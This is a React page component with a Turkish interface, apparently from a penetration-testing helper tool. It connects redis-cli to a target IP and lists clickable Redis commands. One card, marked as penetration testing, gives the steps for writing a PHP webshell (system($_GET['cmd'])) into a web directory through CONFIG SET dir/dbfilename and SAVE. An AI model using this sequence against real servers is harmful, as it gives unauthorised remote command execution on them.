import { useRef, useState } from 'react';
import { useJobs } from '../context/JobContext';
import { useSocket } from '../context/SocketContext';
import { useTerminal } from '../hooks/useTerminal';
import { InfoCard, CmdLine, SectionTitle } from '../components/InfoCard';
import { sendCmd } from '../utils/helpers';

const termId = 'redis-main';

function RedisTerminal() {
  const containerRef = useRef(null);
  const { isReady } = useTerminal(termId, containerRef);
  return (
    <div className="terminal-container" style={{ height: 260 }}>
      <div className="terminal-titlebar">
        <div className="terminal-dots">
          <div className="terminal-dot red" /><div className="terminal-dot yellow" /><div className="terminal-dot green" />
        </div>
        <div className="terminal-title">
          {isReady ? <span style={{ color: 'var(--accent-green)' }}>● redis-cli</span> : <span style={{ color: 'var(--text-muted)' }}>○ bağlanıyor...</span>}
        </div>
      </div>
      <div ref={containerRef} style={{ height: 222, padding: '4px 2px' }} />
    </div>
  );
}

export default function RedisPage({ onBack }) {
  const { activeJob, updateJob } = useJobs();
  const { socket } = useSocket();
  const [ip, setIp] = useState(activeJob?.ip || '');
  const [port, setPort] = useState('6379');

  const connect = () => {
    const target = ip || activeJob?.ip || '';
    if (target && activeJob) updateJob(activeJob.id, { ip: target });
    sendCmd(socket, termId, `redis-cli -h ${target} -p ${port}`);
  };

  const connectLocal = () => sendCmd(socket, termId, `redis-cli -h 127.0.0.1 -p 6379`);

  return (
    <div>
      <div className="page-header">
        <div>
          <div className="page-header-back" onClick={onBack}>← Ana Menü</div>
          <div className="page-title">🗄 <span>Redis</span></div>
          <div className="page-subtitle">Redis veritabanı – In-memory anahtar-değer deposu</div>
        </div>
      </div>

      <div className="ip-bar">
        <span className="ip-bar-label">🎯 Hedef IP</span>
        <input value={ip} onChange={e => { setIp(e.target.value); if (activeJob) updateJob(activeJob.id, { ip: e.target.value }); }}
          placeholder={activeJob?.ip || '10.10.10.10'} style={{ flex: 1 }} />
        <input value={port} onChange={e => setPort(e.target.value)}
          placeholder="Port" style={{ width: 70, background: 'transparent', border: 'none', outline: 'none', color: 'var(--text-primary)', fontFamily: 'JetBrains Mono', fontSize: 13 }} />
      </div>

      <div style={{ display: 'flex', gap: 10, marginBottom: 16 }}>
        <button className="btn btn-green" onClick={connect}>🔌 Uzak Bağlan</button>
        <button className="btn btn-cyan" onClick={connectLocal}>🏠 Localhost Bağlan</button>
      </div>

      <RedisTerminal />

      <div style={{ marginTop: 20 }}>
        <SectionTitle icon="📋">Redis Komut Referansı</SectionTitle>
        <InfoCard title="Temel Komutlar" icon="🔑" defaultOpen color="green">
          <CmdLine cmd="KEYS *" desc="Tüm anahtarları listele (dikkatli kullan, büyük DB'de yavaşlar)" termId={termId} />
          <CmdLine cmd="INFO" desc="ÖNEMLİ: Sunucu bilgisi, versiyon, bellek kullanımı, replikasyon" termId={termId} />
          <CmdLine cmd="GET <anahtar>" desc="Bir anahtarın değerini oku" termId={termId} />
          <CmdLine cmd="SET isim 'birisi'" desc="Anahtar-değer çifti kaydet" termId={termId} />
          <CmdLine cmd="DEL isim" desc="Anahtarı sil" termId={termId} />
          <CmdLine cmd="TYPE <anahtar>" desc="Anahtarın veri tipini öğren (string/list/hash)" termId={termId} />
          <CmdLine cmd="TTL <anahtar>" desc="Anahtarın kaç saniye ömrü kaldığını gör (-1 = sonsuz)" termId={termId} />
        </InfoCard>
        <InfoCard title="Sistem & Kalıcılık (Sızma Testi)" icon="⚡" color="orange">
          <CmdLine cmd="CONFIG GET dir" desc="Redis dosya dizinini öğren" termId={termId} />
          <CmdLine cmd="CONFIG SET dir /tmp" desc="Dizini /tmp'ye değiştir" termId={termId} />
          <CmdLine cmd={`CONFIG SET dbfilename "shell.php"`} desc="Kayıt dosyası adını değiştir" termId={termId} />
          <CmdLine cmd={`SET webshell "<?php system($_GET['cmd']); ?>"`} desc="PHP shell enjekte et" termId={termId} />
          <CmdLine cmd="SAVE" desc="Diske yaz → web dizinine PHP shell düşer" termId={termId} />
        </InfoCard>
        <InfoCard title="INFO Çıktısının Önemli Alanları" icon="ℹ" color="purple">
          <div className="cmd-desc">
            <b>redis_version</b>: Versiyon tutarsızlıkları güvenlik açığı olabilir<br />
            <b>connected_clients</b>: Aktif bağlantı sayısı<br />
            <b>used_memory_human</b>: Bellek kullanımı<br />
            <b>role</b>: master/slave – replikasyon mimarisi<br />
            <b>rdb_last_bgsave_status</b>: Son kayıt başarılı mı?<br />
            <b>config_file</b>: Redis konfigürasyon dosyasının yolu
          </div>
        </InfoCard>
      </div>
    </div>
  );
}
